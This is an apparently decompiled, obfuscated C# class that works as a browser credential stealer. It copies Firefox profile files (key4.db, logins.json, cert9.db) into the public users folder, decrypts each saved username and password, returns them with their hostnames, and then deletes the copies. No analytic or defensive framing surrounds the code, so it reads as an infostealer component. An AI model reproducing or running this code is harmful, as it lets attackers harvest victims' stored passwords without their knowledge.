using System;
using System.Collections.Generic;
using System.IO;

internal class Class74
{
	private static string string_0 = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

	private static string string_1 = Path.Combine(string_0, "Users\\Public");

	private static string[] string_2 = new string[4] { "key3.db", "key4.db", "logins.json", "cert9.db" };

	private static string smethod_0(string string_3)
	{
		string name = new DirectoryInfo(string_3).Name;
		string text = Path.Combine(string_1, name);
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		string[] array = string_2;
		foreach (string path in array)
		{
			try
			{
				string text2 = Path.Combine(string_3, path);
				if (File.Exists(text2))
				{
					File.Copy(text2, Path.Combine(text, Path.GetFileName(text2)));
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return null;
			}
		}
		return Path.Combine(string_1, name);
	}

	public static List<GStruct0> smethod_1(string string_3)
	{
		List<GStruct0> list = new List<GStruct0>();
		string text = Class53.smethod_2(string_3);
		if (text == null)
		{
			return list;
		}
		string text2 = Class53.smethod_3();
		if (text2 == null)
		{
			return list;
		}
		string text3 = smethod_0(text);
		if (text3 == null)
		{
			return list;
		}
		Class51 @class = new Class51(File.ReadAllText(Path.Combine(text3, "logins.json")));
		@class.method_1(new string[2] { ",\"logins\":\\[", ",\"potentiallyVulnerablePasswords\"" });
		string[] array = @class.method_2();
		if (GClass13.smethod_0(text2))
		{
			if (!GClass13.smethod_2(text3))
			{
				Console.WriteLine("Failed to set profile!");
			}
			string[] array2 = array;
			foreach (string data in array2)
			{
				GStruct0 item = default(GStruct0);
				Class51 class2 = new Class51(data);
				string text4 = class2.method_0("hostname");
				string text5 = class2.method_0("encryptedUsername");
				string value = class2.method_0("encryptedPassword");
				if (!string.IsNullOrEmpty(value))
				{
					item.String_0 = text4;
					item.String_1 = GClass13.smethod_3(text5);
					item.String_2 = GClass13.smethod_3(value);
					list.Add(item);
				}
			}
			GClass13.smethod_1();
		}
		Directory.Delete(text3, recursive: true);
		return list;
	}
}
